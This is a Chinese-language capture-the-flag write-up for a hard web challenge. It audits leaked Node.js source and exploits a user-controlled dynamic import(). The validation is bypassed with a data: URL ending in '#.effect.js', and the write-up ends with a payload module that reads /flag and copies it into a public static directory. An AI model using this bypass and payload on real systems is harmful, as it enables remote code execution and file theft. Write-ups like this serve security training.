# WEB10[困难]

## 题目描述
- **提示**：无
- **考点**：Node.js源码泄露、动态`import()`滥用、URL Fragment(`#`)绕过、无回显写文件

## 解题思路
1. **源码审计**：访问`/index.js`发现源码泄露。在`app.post("/upload")`中，`effect`参数完全由用户控制，且传入`loadEffect`中执行。
```bash
async function loadEffect(name) {
  try {
    if (name.endsWith(".effect.js")) return import(name);
  } catch (e) {
    //
  }
  return import("./default.effect.js");
}

app.post("/upload", upload.single("file"), async (req, res) => {
  try {
    const effect = req.body.effect || "./default.effect.js";
    console.log(effect);
    const result = await (await loadEffect(effect)).default(
      req.file.path,
      req.file.path
    );
```
2. **发现漏洞**：`loadEffect`中使用了`import(name)`动态加载模块。虽然有限制`endsWith(".effect.js")`，但JS动态导入支持`data:`URL。
3. **后缀绕过**：由于`multer`会随机化上传的文件名，无法直接通过上传`.effect.js`文件执行。利用URL的锚点特性`#`进行绕过。构造`data:text/javascript;base64,<base64>#.effect.js`，既能满足`endWith`校验，`#`后面的内容又会在解析时被忽略。
```bash
const upload = multer({ dest: "./static/upload" });
```
4. **无回显示突破**：接口只回显图片的 `width/height`，属于无回显 RCE。利用 Node.js 的 `fs` 模块，将读取到的 Flag 写入到静态目录（`express.static` 托管的 `/app/static/` 下），再通过 HTTP 访问读取。由于接口后续会调用 `getWidth()`，恶意代码需返回一个伪造对象防止报错。

## 常用命令/Payload
```javascript
import fs from 'node:fs';
export default async function () {
  const flag = fs.readFileSync('/flag', 'utf8');
  fs.writeFileSync('/app/static/fv.txt', flag);
  return { getWidth: () => 1, getHeight: () => 1 };
}
```

## 结果显示
<img width="2968" height="1444" alt="image" src="https://github.com/user-attachments/assets/4f8d1072-28a8-4d5b-a428-bc1a5e644999" />
<img width="2308" height="726" alt="image" src="https://github.com/user-attachments/assets/98fe74af-693e-4d13-aa5b-2c799d9cc806" />




